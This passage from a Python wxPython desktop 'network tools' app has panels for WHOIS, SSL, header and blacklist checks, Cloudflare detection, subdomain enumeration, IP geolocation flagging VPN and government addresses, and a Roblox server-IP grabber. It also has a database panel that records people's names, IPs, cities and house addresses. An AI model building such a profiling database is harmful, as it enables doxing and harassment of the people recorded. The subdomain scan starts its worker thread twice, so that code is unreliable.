        sizer.Add(self.subnet_result_text, 1, wx.ALL | wx.EXPAND, 10)

        panel.SetSizer(sizer)
        return panel
    
    def on_subnet_calculate(self, event):
        ip_str = self.subnet_ip_input.GetValue().strip()
        mask_str = self.subnet_mask_input.GetValue().strip()

        self.subnet_result_text.Clear()

        if not ip_str:
            self.subnet_result_text.SetValue("Please enter an IP address.")
            return

        if not mask_str:
            self.subnet_result_text.SetValue("Please enter a subnet mask or prefix length.")
            return

        try:
            # If mask is in /xx format
            if mask_str.startswith('/'):
                network = ipaddress.ip_network(f"{ip_str}{mask_str}", strict=False)
            else:
                # If mask is in dotted decimal format
                # Convert mask to prefix length
                try:
                    prefix_len = ipaddress.IPv4Network(f"0.0.0.0/{mask_str}").prefixlen
                    network = ipaddress.ip_network(f"{ip_str}/{prefix_len}", strict=False)
                except ValueError:
                    self.subnet_result_text.SetValue("Invalid subnet mask format.")
                    return

            # Prepare output
            output = []
            output.append(f"Network address: {network.network_address}")
            output.append(f"Broadcast address: {network.broadcast_address}")
            output.append(f"Netmask: {network.netmask}")
            output.append(f"Wildcard mask: {ipaddress.IPv4Address(int(network.hostmask))}")
            output.append(f"Number of hosts: {network.num_addresses - 2 if network.num_addresses > 2 else network.num_addresses}")
            output.append(f"Usable host IP range: {network.network_address + 1} - {network.broadcast_address - 1}")
            output.append(f"Prefix length: /{network.prefixlen}")

            self.subnet_result_text.SetValue("\n".join(output))

        except ValueError as ve:
            self.subnet_result_text.SetValue(f"Error: {ve}")

    def create_mac_lookup_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        # Input row
        input_sizer = wx.BoxSizer(wx.HORIZONTAL)
        mac_label = wx.StaticText(panel, label="Enter MAC Address:")
        self.mac_input = wx.TextCtrl(panel)
        input_sizer.Add(mac_label, 0, wx.ALL | wx.CENTER, 5)
        input_sizer.Add(self.mac_input, 1, wx.ALL | wx.EXPAND, 5)

        # Lookup button
        self.mac_lookup_btn = wx.Button(panel, label="Lookup")
        self.mac_lookup_btn.Bind(wx.EVT_BUTTON, self.on_mac_lookup)
        input_sizer.Add(self.mac_lookup_btn, 0, wx.ALL | wx.CENTER, 5)

        sizer.Add(input_sizer, 0, wx.EXPAND | wx.LEFT | wx.RIGHT | wx.TOP, 10)

        # Result box
        self.mac_result_text = wx.TextCtrl(panel, style=wx.TE_MULTILINE | wx.TE_READONLY)
        sizer.Add(self.mac_result_text, 1, wx.ALL | wx.EXPAND, 10)

        panel.SetSizer(sizer)
        return panel

    def on_mac_lookup(self, event):
        mac = self.mac_input.GetValue().strip()
        self.mac_result_text.Clear()

        # Basic MAC validation (6 pairs of hex digits separated by colon or dash)
        if not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', mac):
            self.mac_result_text.SetValue("Invalid MAC address format.\nExpected format: XX:XX:XX:XX:XX:XX")
            return

        url = f"https://api.macvendors.com/{mac}"

        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200 and response.text:
                vendor = response.text.strip()
                self.mac_result_text.SetValue(f"Vendor: {vendor}")
            else:
                self.mac_result_text.SetValue("Vendor not found or API error.")
        except requests.RequestException as e:
            self.mac_result_text.SetValue(f"Error: {e}")

    def create_reverse_ip_lookup_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        # Input row: Label + IP input + Lookup button
        input_sizer = wx.BoxSizer(wx.HORIZONTAL)
        ip_label = wx.StaticText(panel, label="Enter IP address:")
        self.reverse_ip_input = wx.TextCtrl(panel)

        self.reverse_ip_lookup_btn = wx.Button(panel, label="Lookup")
        input_sizer.Add(ip_label, 0, wx.ALL | wx.CENTER, 5)
        input_sizer.Add(self.reverse_ip_input, 1, wx.ALL | wx.EXPAND, 5)
        input_sizer.Add(self.reverse_ip_lookup_btn, 0, wx.ALL | wx.CENTER, 5)

        sizer.Add(input_sizer, 0, wx.EXPAND | wx.LEFT | wx.RIGHT, 10)

        # Result display multiline text
        self.reverse_ip_result = wx.TextCtrl(panel, style=wx.TE_MULTILINE | wx.TE_READONLY)
        sizer.Add(self.reverse_ip_result, 1, wx.ALL | wx.EXPAND, 10)

        panel.SetSizer(sizer)

        # Bind button event
        self.reverse_ip_lookup_btn.Bind(wx.EVT_BUTTON, self.on_reverse_ip_lookup)

        return panel

    def on_reverse_ip_lookup(self, event):
        ip = self.reverse_ip_input.GetValue().strip()
        self.reverse_ip_result.SetValue("Looking up...")

        def worker():
            try:
                # Perform reverse DNS lookup
                result = socket.gethostbyaddr(ip)
                hostname = result[0]
                aliases = result[1]
                domains = [hostname] + aliases

                output = "Associated domain(s):\n" + "\n".join(domains)
            except socket.herror:
                output = "No PTR record found or invalid IP."
            except Exception as e:
                output = f"Error: {e}"

            wx.CallAfter(self.reverse_ip_result.SetValue, output)

        threading.Thread(target=worker, daemon=True).start()

    def create_ssl_checker_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        # Input row: Label + domain input + Check button
        input_sizer = wx.BoxSizer(wx.HORIZONTAL)
        domain_label = wx.StaticText(panel, label="Enter domain or IP:")
        self.ssl_domain_input = wx.TextCtrl(panel)

        self.ssl_check_btn = wx.Button(panel, label="Check")
        input_sizer.Add(domain_label, 0, wx.ALL | wx.CENTER, 5)
        input_sizer.Add(self.ssl_domain_input, 1, wx.ALL | wx.EXPAND, 5)
        input_sizer.Add(self.ssl_check_btn, 0, wx.ALL | wx.CENTER, 5)

        sizer.Add(input_sizer, 0, wx.EXPAND | wx.LEFT | wx.RIGHT, 10)

        # Result display multiline text
        self.ssl_result_text = wx.TextCtrl(panel, style=wx.TE_MULTILINE | wx.TE_READONLY)
        sizer.Add(self.ssl_result_text, 1, wx.ALL | wx.EXPAND, 10)

        panel.SetSizer(sizer)

        # Bind button event
        self.ssl_check_btn.Bind(wx.EVT_BUTTON, self.on_ssl_check)

        return panel

    def on_ssl_check(self, event):
        host = self.ssl_domain_input.GetValue().strip()
        if not host:
            self.ssl_result_text.SetValue("Please enter a domain or IP address.")
            return

        self.ssl_result_text.SetValue("Checking SSL/TLS certificate...")

        def worker():
            try:
                context = ssl.create_default_context()
                with socket.create_connection((host, 443), timeout=5) as sock:
                    with context.wrap_socket(sock, server_hostname=host) as ssock:
                        cert = ssock.getpeercert()

                        # Parse cert details
                        subject = dict(x[0] for x in cert.get('subject', ()))
                        issuer = dict(x[0] for x in cert.get('issuer', ()))
                        valid_from = cert.get('notBefore', 'N/A')
                        valid_to = cert.get('notAfter', 'N/A')

                        # Convert dates to readable format
                        valid_from_dt = datetime.strptime(valid_from, "%b %d %H:%M:%S %Y %Z")
                        valid_to_dt = datetime.strptime(valid_to, "%b %d %H:%M:%S %Y %Z")

                        output = (
                            f"Issuer: {issuer.get('organizationName', 'N/A')}\n"
                            f"Subject: {subject.get('commonName', 'N/A')}\n"
                            f"Valid From: {valid_from_dt}\n"
                            f"Valid To: {valid_to_dt}\n"
                            f"TLS Version: {ssock.version()}\n"
                        )
            except Exception as e:
                output = f"Error checking SSL/TLS: {e}"

            wx.CallAfter(self.ssl_result_text.SetValue, output)

        threading.Thread(target=worker, daemon=True).start()

    def create_http_header_viewer_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        # Input row: Label + URL input + Fetch button
        input_sizer = wx.BoxSizer(wx.HORIZONTAL)
        url_label = wx.StaticText(panel, label="Enter URL:")
        self.http_url_input = wx.TextCtrl(panel)

        self.http_fetch_btn = wx.Button(panel, label="Fetch Headers")
        input_sizer.Add(url_label, 0, wx.ALL | wx.CENTER, 5)
        input_sizer.Add(self.http_url_input, 1, wx.ALL | wx.EXPAND, 5)
        input_sizer.Add(self.http_fetch_btn, 0, wx.ALL | wx.CENTER, 5)

        sizer.Add(input_sizer, 0, wx.EXPAND | wx.LEFT | wx.RIGHT, 10)

        # Result display multiline text
        self.http_result_text = wx.TextCtrl(panel, style=wx.TE_MULTILINE | wx.TE_READONLY)
        sizer.Add(self.http_result_text, 1, wx.ALL | wx.EXPAND, 10)

        panel.SetSizer(sizer)

        # Bind button event
        self.http_fetch_btn.Bind(wx.EVT_BUTTON, self.on_http_fetch)

        return panel

    def on_http_fetch(self, event):
        url = self.http_url_input.GetValue().strip()
        if not url:
            self.http_result_text.SetValue("Please enter a valid URL.")
            return

        self.http_result_text.SetValue("Fetching HTTP headers...")

        def worker():
            try:
                # Make sure URL has scheme
                if not (url.startswith("http://") or url.startswith("https://")):
                    target_url = "http://" + url
                else:
                    target_url = url

                response = requests.head(target_url, timeout=7)
                headers = response.headers

                output = "\n".join(f"{k}: {v}" for k, v in headers.items())
                if not output:
                    output = "No headers returned."
            except Exception as e:
                output = f"Error fetching headers: {e}"

            wx.CallAfter(self.http_result_text.SetValue, output)

        threading.Thread(target=worker, daemon=True).start()

    def create_whois_lookup_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        # Input row: Label + domain/IP input + lookup button
        input_sizer = wx.BoxSizer(wx.HORIZONTAL)
        domain_label = wx.StaticText(panel, label="Enter domain or IP:")
        self.whois_input = wx.TextCtrl(panel)

        self.whois_lookup_btn = wx.Button(panel, label="Lookup")
        input_sizer.Add(domain_label, 0, wx.ALL | wx.CENTER, 5)
        input_sizer.Add(self.whois_input, 1, wx.ALL | wx.EXPAND, 5)
        input_sizer.Add(self.whois_lookup_btn, 0, wx.ALL | wx.CENTER, 5)

        sizer.Add(input_sizer, 0, wx.EXPAND | wx.LEFT | wx.RIGHT, 10)

        # Result display multiline text (readonly)
        self.whois_result_text = wx.TextCtrl(panel, style=wx.TE_MULTILINE | wx.TE_READONLY)
        sizer.Add(self.whois_result_text, 1, wx.ALL | wx.EXPAND, 10)

        panel.SetSizer(sizer)

        # Bind lookup button
        self.whois_lookup_btn.Bind(wx.EVT_BUTTON, self.on_whois_lookup)

        return panel

    def on_whois_lookup(self, event):
        query = self.whois_input.GetValue().strip()
        if not query:
            self.whois_result_text.SetValue("Please enter a domain or IP address.")
            return

        self.whois_result_text.SetValue("Performing WHOIS lookup...")

        def worker():
            try:
                # Run whois lookup
                result = whois.whois(query)
                if isinstance(result, dict):
                    # Format dict result nicely
                    output = "\n".join(f"{k}: {v}" for k, v in result.items())
                else:
                    # If result is raw text or other type
                    output = str(result)
            except Exception as e:
                output = f"Error performing WHOIS lookup: {e}"

            wx.CallAfter(self.whois_result_text.SetValue, output)

        threading.Thread(target=worker, daemon=True).start()

    def create_ip_blacklist_checker_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        # Input row: Label + IP input + Check button
        input_sizer = wx.BoxSizer(wx.HORIZONTAL)
        ip_label = wx.StaticText(panel, label="Enter IP address:")
        self.blacklist_ip_input = wx.TextCtrl(panel)

        self.blacklist_check_btn = wx.Button(panel, label="Check")
        input_sizer.Add(ip_label, 0, wx.ALL | wx.CENTER, 5)
        input_sizer.Add(self.blacklist_ip_input, 1, wx.ALL | wx.EXPAND, 5)
        input_sizer.Add(self.blacklist_check_btn, 0, wx.ALL | wx.CENTER, 5)

        sizer.Add(input_sizer, 0, wx.EXPAND | wx.LEFT | wx.RIGHT, 10)

        # Result display multiline text (readonly)
        self.blacklist_result_text = wx.TextCtrl(panel, style=wx.TE_MULTILINE | wx.TE_READONLY)
        sizer.Add(self.blacklist_result_text, 1, wx.ALL | wx.EXPAND, 10)

        panel.SetSizer(sizer)

        # Bind check button event
        self.blacklist_check_btn.Bind(wx.EVT_BUTTON, self.on_blacklist_check)

        return panel

    def on_blacklist_check(self, event):
        ip = self.blacklist_ip_input.GetValue().strip()
        if not ip:
            self.blacklist_result_text.SetValue("Please enter an IP address.")
            return

        # Validate IP format (basic)
        parts = ip.split('.')
        if len(parts) != 4 or not all(part.isdigit() and 0 <= int(part) <= 255 for part in parts):
            self.blacklist_result_text.SetValue("Invalid IPv4 address format.")
            return

        self.blacklist_result_text.SetValue("Checking blacklists...")

        def worker():
            reversed_ip = ".".join(ip.split('.')[::-1])
            results = []
            for bl in BLACKLISTS:
                query = f"{reversed_ip}.{bl}"
                try:
                    socket.gethostbyname(query)
                    results.append(f"Listed on {bl}")
                except socket.gaierror:
                    results.append(f"Not listed on {bl}")
                except Exception as e:
                    results.append(f"Error checking {bl}: {e}")

            output = "\n".join(results)
            wx.CallAfter(self.blacklist_result_text.SetValue, output)

        threading.Thread(target=worker, daemon=True).start()

    def create_cloudflare_scanner_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        # Input row: Label + website input + Scan button
        input_sizer = wx.BoxSizer(wx.HORIZONTAL)
        url_label = wx.StaticText(panel, label="Enter website URL:")
        self.cloudflare_url_input = wx.TextCtrl(panel)
        self.cloudflare_scan_btn = wx.Button(panel, label="Scan")
        input_sizer.Add(url_label, 0, wx.ALL | wx.CENTER, 5)
        input_sizer.Add(self.cloudflare_url_input, 1, wx.ALL | wx.EXPAND, 5)
        input_sizer.Add(self.cloudflare_scan_btn, 0, wx.ALL | wx.CENTER, 5)

        sizer.Add(input_sizer, 0, wx.EXPAND | wx.LEFT | wx.RIGHT, 10)

        # Output display multiline text (readonly)
        self.cloudflare_result_text = wx.TextCtrl(panel, style=wx.TE_MULTILINE | wx.TE_READONLY)
        sizer.Add(self.cloudflare_result_text, 1, wx.ALL | wx.EXPAND, 10)

        # Spinner label for animation
        self.cloudflare_spinner_label = wx.StaticText(panel, label="")
        sizer.Add(self.cloudflare_spinner_label, 0, wx.ALIGN_CENTER | wx.BOTTOM, 10)

        panel.SetSizer(sizer)

        # Bind scan button event
        self.cloudflare_scan_btn.Bind(wx.EVT_BUTTON, self.on_cloudflare_scan_button)

        # State variables
        self.cloudflare_scanning = False
        self.cloudflare_scan_thread = None

        return panel


    def on_cloudflare_scan_button(self, event):
        if not self.cloudflare_scanning:
            url = self.cloudflare_url_input.GetValue().strip()
            if not url:
                wx.MessageBox("Please enter a website URL", "Error", wx.ICON_ERROR)
                return
            self.cloudflare_scanning = True
            self.cloudflare_scan_btn.SetLabel("Stop")
            self.cloudflare_result_text.SetValue("")
            self.cloudflare_spinner_label.SetLabel("")
            self.cloudflare_scan_thread = threading.Thread(target=self.cloudflare_scan, args=(url,), daemon=True)
            self.cloudflare_scan_thread.start()
            self.animate_cloudflare_spinner()
        else:
            # Stop scanning
            self.cloudflare_scanning = False
            self.cloudflare_scan_btn.SetLabel("Scan")
            self.cloudflare_spinner_label.SetLabel("Scan stopped by user.")


    def animate_cloudflare_spinner(self):
        spinner_chars = ['|', '/', '-', '\\']
        def spin():
            i = 0
            while self.cloudflare_scanning:
                wx.CallAfter(self.cloudflare_spinner_label.SetLabel, f"Scanning... {spinner_chars[i % len(spinner_chars)]}")
                i += 1
                time.sleep(0.15)
            wx.CallAfter(self.cloudflare_spinner_label.SetLabel, "")
        threading.Thread(target=spin, daemon=True).start()


    def cloudflare_scan(self, url):
        def log(msg):
            wx.CallAfter(self.cloudflare_result_text.AppendText, msg + "\n")

        log(f"Starting scan for {url} ...")
        time.sleep(1)

        if not url.startswith("http://") and not url.startswith("https://"):
            url = "http://" + url
            log(f"Normalized URL to {url}")

        try:
            log("Performing HTTP request...")
            resp = requests.get(url, timeout=8)
            log(f"Received HTTP {resp.status_code}")
            time.sleep(1)

            cloudflare_headers = [
                'server',
                'cf-ray',
                'cf-cache-status',
                'cf-request-id'
            ]

            cf_detected = False
            for header in cloudflare_headers:
                if header in resp.headers:
                    log(f"Detected Cloudflare header: {header} = {resp.headers[header]}")
                    cf_detected = True

            if cf_detected:
                log("\n[-] Cloudflare protection detected!")
            else:
                log("\n[+] No Cloudflare headers found. The site may not be protected by Cloudflare.")
        except Exception as e:
            log(f"Error during scan: {e}")

        wx.CallAfter(self.finish_cloudflare_scan)

    def finish_cloudflare_scan(self):
        self.cloudflare_scanning = False
        self.cloudflare_scan_btn.SetLabel("Scan")
        self.cloudflare_spinner_label.SetLabel("Scan complete.")

    def create_website_to_ip_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        # Input row: Label + website input + Lookup button
        input_sizer = wx.BoxSizer(wx.HORIZONTAL)
        website_label = wx.StaticText(panel, label="Enter Website URL:")
        self.website_input = wx.TextCtrl(panel)
        self.website_lookup_btn = wx.Button(panel, label="Lookup")

        input_sizer.Add(website_label, 0, wx.ALL | wx.CENTER, 5)
        input_sizer.Add(self.website_input, 1, wx.ALL | wx.EXPAND, 5)
        input_sizer.Add(self.website_lookup_btn, 0, wx.ALL | wx.CENTER, 5)

        sizer.Add(input_sizer, 0, wx.EXPAND | wx.LEFT | wx.RIGHT, 10)

        # Result display multiline text
        self.website_ip_result = wx.TextCtrl(panel, style=wx.TE_MULTILINE | wx.TE_READONLY)
        sizer.Add(self.website_ip_result, 1, wx.ALL | wx.EXPAND, 10)

        panel.SetSizer(sizer)

        # Bind button event
        self.website_lookup_btn.Bind(wx.EVT_BUTTON, self.on_website_lookup)

        return panel

    def on_website_lookup(self, event):
        website = self.website_input.GetValue().strip()
        if not website:
            self.website_ip_result.SetValue("Please enter a website URL.")
            return

        self.website_ip_result.SetValue("Looking up...")

        def worker():
            try:
                ip = socket.gethostbyname(website)
                output = f"Website: {website}\nIP Address: {ip}"
            except socket.gaierror:
                output = f"Could not resolve IP for: {website}"
            except Exception as e:
                output = f"Error: {e}"

            wx.CallAfter(self.website_ip_result.SetValue, output)

        threading.Thread(target=worker, daemon=True).start()

    def create_subdomain_scanner_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        # Input row: domain + scan button
        input_sizer = wx.BoxSizer(wx.HORIZONTAL)
        domain_label = wx.StaticText(panel, label="Enter Domain:")
        self.subdomain_input = wx.TextCtrl(panel)
        self.subdomain_scan_btn = wx.Button(panel, label="Start Scan")

        input_sizer.Add(domain_label, 0, wx.ALL | wx.CENTER, 5)
        input_sizer.Add(self.subdomain_input, 1, wx.ALL | wx.EXPAND, 5)
        input_sizer.Add(self.subdomain_scan_btn, 0, wx.ALL | wx.CENTER, 5)

        sizer.Add(input_sizer, 0, wx.EXPAND | wx.LEFT | wx.RIGHT, 10)

        # ListCtrl table for results: Subdomain | IP Address
        self.subdomain_table = wx.ListCtrl(panel, style=wx.LC_REPORT | wx.BORDER_SUNKEN)
        self.subdomain_table.InsertColumn(0, "Subdomain", width=250)
        self.subdomain_table.InsertColumn(1, "IP Address", width=150)
        sizer.Add(self.subdomain_table, 1, wx.ALL | wx.EXPAND, 10)

        panel.SetSizer(sizer)

        # Bind button event
        self.subdomain_scan_btn.Bind(wx.EVT_BUTTON, self.on_subdomain_scan)

        self.subdomain_scanning = False

        return panel

    def on_subdomain_scan(self, event):
        domain = self.subdomain_input.GetValue().strip()
        if not domain:
            wx.MessageBox("Please enter a domain.", "Error", wx.OK | wx.ICON_ERROR)
            return

        if self.subdomain_scanning:
            wx.MessageBox("Scan already running.", "Info", wx.OK | wx.ICON_INFORMATION)
            return

        self.subdomain_scanning = True
        self.subdomain_scan_btn.Disable()
        self.subdomain_table.DeleteAllItems()

        def get_subdomains_from_otx(domain):
            url = f"https://otx.alienvault.com/api/v1/indicators/domain/{domain}/passive_dns"
            try:
                response = requests.get(url, timeout=15)
                if response.status_code == 200:
                    data = response.json()
                    subdomains = set()
                    for entry in data.get("passive_dns", []):
                        hostname = entry.get("hostname")
                        if hostname and hostname.endswith(domain):
                            subdomains.add(hostname.strip())
                    return list(subdomains)
                else:
                    wx.CallAfter(wx.MessageBox, f"Failed to fetch from OTX (Status: {response.status_code})", "Error", wx.OK | wx.ICON_ERROR)
                    return []
            except requests.RequestException as e:
                wx.CallAfter(wx.MessageBox, f"Error fetching from OTX: {e}", "Error", wx.OK | wx.ICON_ERROR)
                return []

        def add_subdomain_result(sub, ip):
            index = self.subdomain_table.InsertItem(self.subdomain_table.GetItemCount(), sub)
            self.subdomain_table.SetItem(index, 1, ip)

        def finish_scan():
            self.subdomain_scanning = False
            self.subdomain_scan_btn.Enable()

        def worker():
            start_time = time.time()
            subdomains = get_subdomains_from_otx(domain)

            if not subdomains:
                wx.CallAfter(wx.MessageBox, f"No subdomains found for {domain}", "Info", wx.OK | wx.ICON_INFORMATION)
                wx.CallAfter(finish_scan)
                return

            found_set = set()
            for sub in subdomains:
                if sub in found_set:
                    continue
                found_set.add(sub)
                try:
                    ip = socket.gethostbyname(sub)
                    wx.CallAfter(add_subdomain_result, sub, ip)
                except socket.gaierror:
                    pass  # Ignore failed DNS

            elapsed = time.time() - start_time
            wx.CallAfter(finish_scan)
            wx.CallAfter(wx.MessageBox, f"Subdomain scan complete. Found {len(found_set)} subdomains in {elapsed:.2f} seconds.", "Done", wx.OK | wx.ICON_INFORMATION)

        import threading
        threading.Thread(target=worker, daemon=True).start()

        def add_subdomain_result(subdomain, ip):
            idx = self.subdomain_table.InsertItem(self.subdomain_table.GetItemCount(), subdomain)
            self.subdomain_table.SetItem(idx, 1, ip)

        def finish_scan():
            self.subdomain_scanning = False
            self.subdomain_scan_btn.Enable()

        threading.Thread(target=worker, daemon=True).start()

    def create_ip_checker_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        # Input row: label + IP entry + Check button
        input_sizer = wx.BoxSizer(wx.HORIZONTAL)
        ip_label = wx.StaticText(panel, label="Enter IP address:")
        self.ip_check_input = wx.TextCtrl(panel)
        self.ip_check_button = wx.Button(panel, label="Check IP")

        input_sizer.Add(ip_label, 0, wx.ALL | wx.CENTER, 5)
        input_sizer.Add(self.ip_check_input, 1, wx.ALL | wx.EXPAND, 5)
        input_sizer.Add(self.ip_check_button, 0, wx.ALL | wx.CENTER, 5)

        sizer.Add(input_sizer, 0, wx.EXPAND | wx.LEFT | wx.RIGHT, 10)

        # Result output box multiline, readonly
        self.ip_check_result = wx.TextCtrl(panel, style=wx.TE_MULTILINE | wx.TE_READONLY)
        sizer.Add(self.ip_check_result, 1, wx.ALL | wx.EXPAND, 10)

        panel.SetSizer(sizer)

        # Bind button event
        self.ip_check_button.Bind(wx.EVT_BUTTON, self.on_ip_check)

        return panel


    def on_ip_check(self, event):
        ip = self.ip_check_input.GetValue().strip()
        if not ip:
            wx.MessageBox("Please enter an IP address.", "Error", wx.OK | wx.ICON_ERROR)
            return

        self.ip_check_result.SetValue("Checking IP... Please wait.")

        def worker():
            try:
                # Query ip-api.com for geolocation and org info
                url = f"http://ip-api.com/json/{ip}"
                response = requests.get(url, timeout=10)
                data = response.json()

                if data.get("status") != "success":
                    output = f"Failed to get info: {data.get('message', 'Unknown error')}"
                else:
                    isp = data.get("isp", "Unknown")
                    org = data.get("org", "Unknown")
                    country = data.get("country", "Unknown")

                    # Check for VPN/Proxy keywords in ISP or Org fields
                    vpn_keywords = ["vpn", "proxy", "hosting", "datacenter", "amazon", "digitalocean", "cloudflare"]
                    is_vpn_proxy = any(kw in isp.lower() for kw in vpn_keywords) or any(kw in org.lower() for kw in vpn_keywords)

                    # Check if Org or ISP looks like a government entity
                    gov_keywords = ["gov", "government", "state", "federal", "department", "agency", "ministry", ".mil"]
                    is_gov = any(kw in org.lower() for kw in gov_keywords) or any(kw in isp.lower() for kw in gov_keywords)

                    output = (
                        f"IP: {ip}\n"
                        f"Country: {country}\n"
                        f"ISP: {isp}\n"
                        f"Organization: {org}\n"
                        f"Possible VPN/Proxy: {'Yes' if is_vpn_proxy else 'No'}\n"
                        f"Government IP/Org: {'Yes' if is_gov else 'No'}"
                    )
            except Exception as e:
                output = f"Error checking IP: {e}"

            wx.CallAfter(self.ip_check_result.SetValue, output)

        threading.Thread(target=worker, daemon=True).start()

    def create_roblox_sniffer_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        instructions = wx.StaticText(panel, label="Click the button to grab the IP address of the current Roblox game (must be connected).")
        sizer.Add(instructions, 0, wx.ALL | wx.EXPAND, 10)

        self.roblox_result = wx.TextCtrl(panel, style=wx.TE_MULTILINE | wx.TE_READONLY, size=(-1, 100))
        sizer.Add(self.roblox_result, 1, wx.ALL | wx.EXPAND, 10)

        grab_button = wx.Button(panel, label="Grab IP")
        grab_button.Bind(wx.EVT_BUTTON, self.on_grab_roblox_ip)
        sizer.Add(grab_button, 0, wx.ALL | wx.ALIGN_LEFT, 10)

        panel.SetSizer(sizer)
        self.content_sizer.Add(panel, 1, wx.EXPAND)
        self.tool_panels["Roblox Game IP Sniffer"] = panel
        return panel

    def on_grab_roblox_ip(self, event):
        username = os.getenv('username')
        if not username:
            self.roblox_result.SetValue("Error: Could not get username from environment variables.")
            return

        log_dir = fr'C:\Users\{username}\AppData\Local\Roblox\logs'
        list_of_files = glob.glob(os.path.join(log_dir, '*'))

        if not list_of_files:
            self.roblox_result.SetValue("Error: Could not find any Roblox log files.")
            return

        latest_file = max(list_of_files, key=os.path.getctime)

        found = False
        try:
            with open(latest_file, 'r', encoding='utf-8', errors='ignore') as roblox_log:
                for line in roblox_log:
                    if 'Connection accepted from' in line:
                        line = line.replace('Connection accepted from', '')
                        line2 = line.replace('|', ':')
                        line3 = line2[25:].strip()

                        self.roblox_result.SetValue(f"Roblox Server IP: {line3}")

                        with open('server_ips.txt', 'a', encoding='utf-8') as ip_history:
                            ip_history.write(line3 + "\n")
                        found = True
                        break

            if not found:
                self.roblox_result.SetValue("Could not find 'Connection accepted from' in the latest log file.\nMake sure you're in a game.")
        except Exception as e:
            self.roblox_result.SetValue(f"Error reading log file: {str(e)}")

    def create_info_database_panel(self):
        self.db_data = []  # In-memory storage
        self.audit_log = []  # Track history of changes
        self.load_db_from_csv()  # Load data from CSV on startup

        panel = wx.Panel(self.content_panel)
        main_sizer = wx.BoxSizer(wx.HORIZONTAL)

        # Left side: Controls + table
        left_panel = wx.Panel(panel)
        left_sizer = wx.BoxSizer(wx.VERTICAL)

        # Search bar and filter buttons
        search_sizer = wx.BoxSizer(wx.HORIZONTAL)
        search_label = wx.StaticText(left_panel, label="Search:")
        self.db_search = wx.TextCtrl(left_panel)
        self.db_search.Bind(wx.EVT_TEXT, self.on_db_search)

        filter_label = wx.StaticText(left_panel, label="Sort by:")
        self.db_filter = wx.Choice(left_panel, choices=["Most Recent", "Alphabetical (Name)"])
        self.db_filter.SetSelection(0)
        self.db_filter.Bind(wx.EVT_CHOICE, self.on_db_filter)

        search_sizer.Add(search_label, 0, wx.ALL | wx.CENTER, 5)
        search_sizer.Add(self.db_search, 1, wx.ALL | wx.EXPAND, 5)
        search_sizer.Add(filter_label, 0, wx.ALL | wx.CENTER, 5)
        search_sizer.Add(self.db_filter, 0, wx.ALL | wx.CENTER, 5)

        left_sizer.Add(search_sizer, 0, wx.EXPAND | wx.LEFT | wx.RIGHT, 10)

        # Buttons
        btn_sizer = wx.BoxSizer(wx.HORIZONTAL)
        self.db_new_btn = wx.Button(left_panel, label="New Entry")
        self.db_edit_btn = wx.Button(left_panel, label="Edit Entry")
        self.db_edit_btn.Disable()
        self.db_delete_btn = wx.Button(left_panel, label="Delete Entry")
        self.db_delete_btn.Disable()

        btn_sizer.Add(self.db_new_btn, 0, wx.ALL, 5)
        btn_sizer.Add(self.db_edit_btn, 0, wx.ALL, 5)
        btn_sizer.Add(self.db_delete_btn, 0, wx.ALL, 5)

        left_sizer.Add(btn_sizer, 0, wx.LEFT | wx.RIGHT, 10)

        # Table
        self.db_table = wx.ListCtrl(left_panel, style=wx.LC_REPORT | wx.BORDER_SUNKEN | wx.LC_SORT_ASCENDING)
        columns = ["Name", "IP", "ISP", "City", "State", "Country", "Status", "House Address", "Date"]
        for i, col in enumerate(columns):
            self.db_table.InsertColumn(i, col)
            self.db_table.SetColumnWidth(i, 120 if i != 7 else 150)

        self.db_table.Bind(wx.EVT_LIST_ITEM_SELECTED, self.on_db_item_selected)
        self.db_table.Bind(wx.EVT_LIST_COL_CLICK, self.on_db_column_click)

        left_sizer.Add(self.db_table, 1, wx.ALL | wx.EXPAND, 10)

        left_panel.SetSizer(left_sizer)

        # Right side: Entry Preview + Audit Log
        right_panel = wx.Panel(panel)
        right_sizer = wx.BoxSizer(wx.VERTICAL)

        # Detailed View
        self.detail_text = wx.TextCtrl(right_panel, style=wx.TE_MULTILINE | wx.TE_READONLY)
        right_sizer.Add(wx.StaticText(right_panel, label="Entry Preview:"), 0, wx.LEFT | wx.TOP, 5)
        right_sizer.Add(self.detail_text, 1, wx.ALL | wx.EXPAND, 5)

        # Audit Log
        self.audit_text = wx.TextCtrl(right_panel, style=wx.TE_MULTILINE | wx.TE_READONLY)
        right_sizer.Add(wx.StaticText(right_panel, label="Audit Log:"), 0, wx.LEFT | wx.TOP, 5)
        right_sizer.Add(self.audit_text, 1, wx.ALL | wx.EXPAND, 5)

        right_panel.SetSizer(right_sizer)

        # Add both panels side by side
        main_sizer.Add(left_panel, 3, wx.EXPAND)
        main_sizer.Add(right_panel, 2, wx.EXPAND | wx.LEFT, 10)

        panel.SetSizer(main_sizer)

        # Bind button events
        self.db_new_btn.Bind(wx.EVT_BUTTON, self.on_db_new)
        self.db_edit_btn.Bind(wx.EVT_BUTTON, self.on_db_edit)
        self.db_delete_btn.Bind(wx.EVT_BUTTON, self.on_db_delete)

        self.current_sort_col = 8  # default sort by date
        self.sort_ascending = False

        self.refresh_db_table()
        self.update_audit_log()

        return panel

    def on_db_search(self, event):
        query = self.db_search.GetValue().lower()
        # Filter db_data for any column containing query substring
        self.filtered_data = [entry for entry in self.db_data if any(query in str(entry[col]).lower() for col in entry)]
        self.refresh_db_table(filtered=True)

    def on_db_edit(self, event):
